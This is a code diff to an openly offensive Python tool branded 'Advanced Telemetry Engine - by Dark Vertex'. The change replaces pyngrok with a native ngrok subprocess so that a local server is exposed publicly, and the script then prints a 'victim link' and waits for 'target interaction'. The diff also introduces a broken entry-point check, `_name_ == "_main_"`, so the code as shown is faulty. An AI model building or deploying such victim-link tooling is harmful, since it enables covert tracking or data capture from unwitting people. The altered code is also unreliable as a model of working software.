@@ -5,14 +5,10 @@ import json
 import threading
 import sys
 import os
-
-# Pyngrok check and import for automatic link generation
-try:
-    from pyngrok import ngrok
-except ImportError:
-    print("\033[1;31m[-] Error: 'pyngrok' library is missing.\033[0m")
-    print("\033[1;33m[+] Please install it once using: pip install pyngrok\033[0m")
-    sys.exit(1)
+import subprocess
+import time
+import urllib.request
+import urllib.error
 
 PORT = 8080
 
@@ -220,7 +216,20 @@ def run_server():
     with AdvancedThreadingServer(("", PORT), AdvancedHandler) as httpd:
         httpd.serve_forever()
 
-if __name__ == "__main__":
+def get_ngrok_url():
+    for _ in range(10):
+        try:
+            req = urllib.request.urlopen("http://127.0.0.1:4040/api/tunnels")
+            res = json.loads(req.read().decode())
+            tunnels = res.get("tunnels", [])
+            for tunnel in tunnels:
+                if tunnel.get("proto") == "https":
+                    return tunnel.get("public_url")
+        except Exception:
+            time.sleep(1)
+    return None
+
+if _name_ == "_main_":
     os.system('clear' if os.name == 'posix' else 'cls')
     print("\033[1;31m")
     print(r"""
@@ -232,23 +241,35 @@ if __name__ == "__main__":
     """)
     print("        [>] ADVANCED TELEMETRY ENGINE - BY DARK VERTEX\033[0m\n")
     
-    # Start server in a background thread
+    # Start server in background thread
     server_thread = threading.Thread(target=run_server, daemon=True)
     server_thread.start()
     print(f"[*] Local multi-threaded core initialized on port {PORT}...")
 
-    # Automatically generate public tunnel link using pyngrok
-    try:
-        public_url = ngrok.connect(PORT)
+    # Start native ngrok via subprocess to avoid pyngrok android architecture error
+    print("[*] Launching secure tunnel protocol...")
+    ngrok_process = subprocess.Popen(
+        ["ngrok", "http", str(PORT)],
+        stdout=subprocess.DEVNULL,
+        stderr=subprocess.DEVNULL
+    )
+
+    # Fetch public URL automatically from ngrok local API
+    public_url = get_ngrok_url()
+    
+    if public_url:
         print(f"\n\033[1;32m[+] VICTIM LINK GENERATED SUCCESSFULLY:\033[0m")
         print(f"\033[1;36m{public_url}\033[0m\n")
         print("[*] Waiting for target interaction... (Press Ctrl+C to exit)\n")
-        
-        # Keep main thread alive
+    else:
+        print("\n\033[1;31m[-] Failed to fetch public URL. Make sure 'ngrok' is installed and authenticated.\033[0m")
+        ngrok_process.terminate()
+        sys.exit(1)
+
+    try:
         while True:
             threading.Event().wait(1)
-            
     except KeyboardInterrupt:
-        print("\n[!] Execution terminated by operator. Cleaning up tunnels...")
-        ngrok.kill()
+        print("\n[!] Execution terminated by operator. Cleaning up processes...")
+        ngrok_process.terminate()
         sys.exit(0)
